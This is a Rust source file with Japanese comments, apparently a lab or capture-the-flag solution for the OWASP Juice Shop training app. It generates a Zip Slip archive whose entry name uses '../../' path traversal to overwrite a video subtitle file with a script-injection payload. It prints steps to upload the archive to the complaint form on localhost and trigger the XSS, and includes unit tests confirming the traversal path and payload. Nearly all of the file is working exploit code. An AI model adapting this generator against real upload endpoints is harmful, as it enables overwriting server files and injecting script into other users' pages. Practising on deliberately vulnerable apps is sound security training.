//! Zip Slip ペイロード生成ツール
//! 
//! Usage: cargo run --bin zip-slip
//! Output: exploit.zip

use std::fs::File;
use std::io::Write;
use zip::write::FileOptions;
use zip::ZipWriter;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("=== Juice Shop Video XSS - Zip Slip Generator ===\n");
    
    // XSS ペイロードを含む VTT ファイルの内容
    let malicious_vtt = r#"WEBVTT

00:00:00.000 --> 00:00:10.000
</script><script>alert('xss')</script>
"#;

    // ターゲットパス（パストラバーサル付き）
    let target_path = "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt";

    println!("[*] Creating exploit.zip...");
    println!("[*] Target path: {}", target_path);
    println!("[*] Payload: </script><script>alert('xss')</script>");
    
    // ZIP ファイルを作成
    let file = File::create("exploit.zip")?;
    let mut zip = ZipWriter::new(file);

    // パストラバーサル付きのエントリを追加
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored);
    
    zip.start_file(target_path, options)?;
    zip.write_all(malicious_vtt.as_bytes())?;
    
    zip.finish()?;
    
    println!("\n[+] Created: exploit.zip");
    println!("[+] Size: {} bytes", std::fs::metadata("exploit.zip")?.len());
    
    println!("\n=== Next steps ===");
    println!("1. Upload exploit.zip to http://localhost:3000/#/complain");
    println!("2. Check: curl http://localhost:3000/assets/public/videos/owasp_promo.vtt");
    println!("3. Trigger XSS: http://localhost:3000/promotion");
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Read;
    use zip::ZipArchive;

    #[test]
    fn test_zip_creation() {
        let malicious_vtt = "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n</script><script>alert('xss')</script>\n";
        let target_path = "../../test/path/file.vtt";
        
        let file = File::create("test_exploit.zip").unwrap();
        let mut zip = ZipWriter::new(file);
        
        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Stored);
        
        zip.start_file(target_path, options).unwrap();
        zip.write_all(malicious_vtt.as_bytes()).unwrap();
        zip.finish().unwrap();
        
        // 検証: ZIP を開いて内容を確認
        let file = File::open("test_exploit.zip").unwrap();
        let mut archive = ZipArchive::new(file).unwrap();
        
        assert_eq!(archive.len(), 1);
        
        let mut zip_file = archive.by_index(0).unwrap();
        assert!(zip_file.name().contains("../"));
        
        let mut contents = String::new();
        zip_file.read_to_string(&mut contents).unwrap();
        assert!(contents.contains("alert('xss')"));
        
        // クリーンアップ
        std::fs::remove_file("test_exploit.zip").unwrap();
    }
    
    #[test]
    fn test_path_traversal_format() {
        let target_path = "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt";
        assert!(target_path.starts_with("../"));
        assert!(target_path.contains("frontend"));
        assert!(target_path.ends_with(".vtt"));
    }
}
